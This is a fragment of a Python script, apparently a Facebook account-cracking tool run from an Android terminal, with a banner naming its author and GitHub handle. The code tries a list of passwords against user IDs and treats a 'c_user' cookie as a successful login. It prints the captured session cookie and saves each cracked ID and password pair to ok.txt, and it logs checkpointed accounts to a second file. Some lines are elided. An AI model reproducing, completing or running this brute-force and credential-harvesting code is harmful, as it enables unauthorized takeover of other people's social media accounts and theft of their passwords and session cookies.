...
\033[1;32m[~] AUTHOR    :\033[1;32m APP DEVELOPMENT COURSE
\033[1;32m[~] GITHUB    :\033[1;32m Hacker25802
\033[1;32m[~] FACEBOOK  :\033[1;32m Frands
\033[1;92m══════════════════════════════════════════
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/Frands.pyApp_Davlatmant_Course/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/App_Davlatmant_Course-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
